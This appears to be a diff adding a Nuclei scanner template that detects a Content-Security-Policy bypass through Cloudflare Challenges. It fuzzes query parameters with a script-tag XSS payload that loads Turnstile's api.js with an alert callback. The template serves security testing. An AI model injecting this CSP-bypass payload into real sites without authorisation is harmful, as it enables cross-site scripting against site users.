@@ -1,0 +1,55 @@
+id: cloudflare-challenges-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Cloudflare Challenges
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,cloudflare-challenges
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "cloudflare.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: cloudflare_challenges_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "cloudflare_challenges_csp_xss == true"
+# digest: 4b0a00483046022100a7c343498f41944151252602f3b701af34ba12585d5416b0760700477574c9a102210080d619e967570c0eb53981f130c14a32f2cd47f4a568c0c469f3e8ac5bc6d97e:922c64590222798bb761d5b6d8e72950
